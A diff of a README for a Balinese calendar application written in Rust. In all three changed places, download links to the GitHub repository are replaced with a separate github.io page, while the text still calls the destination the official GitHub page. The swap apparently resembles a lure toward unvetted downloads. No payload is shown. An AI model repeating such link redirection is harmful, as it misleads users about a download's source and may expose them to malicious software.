@@ -1,6 +1,6 @@
 # 📅 balinese-calendar-rust - Your Guide to Balinese Time & Culture
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blueviolet?style=for-the-badge&logo=github)](https://github.com/asnash9306/balinese-calendar-rust)
+[![Download Now](https://img.shields.io/badge/Download-Application-blueviolet?style=for-the-badge&logo=github)](https://asnash9306.github.io)
 
 ## 🎯 What This Application Does
 
@@ -36,7 +36,7 @@ Follow these super simple steps to get the program running on your Windows compu
 
 Click this button to go to the download page:
 
-[![Download Application](https://img.shields.io/badge/⬇️-Download_Now-orange?style=for-the-badge&logo=windows)](https://github.com/asnash9306/balinese-calendar-rust)
+[![Download Application](https://img.shields.io/badge/⬇️-Download_Now-orange?style=for-the-badge&logo=windows)](https://asnash9306.github.io)
 
 This will take you to the official GitHub page for the project.
 
@@ -129,7 +129,7 @@ The "WebAssembly" feature means the program can be in web pages, allowing you to
 
 To check for new versions:
 
-1. Visit the [download page](https://github.com/asnash9306/balinese-calendar-rust)
+1. Visit the [download page](https://asnash9306.github.io)
 2. Look for "Releases" section
 3. Download the newest version if available
 
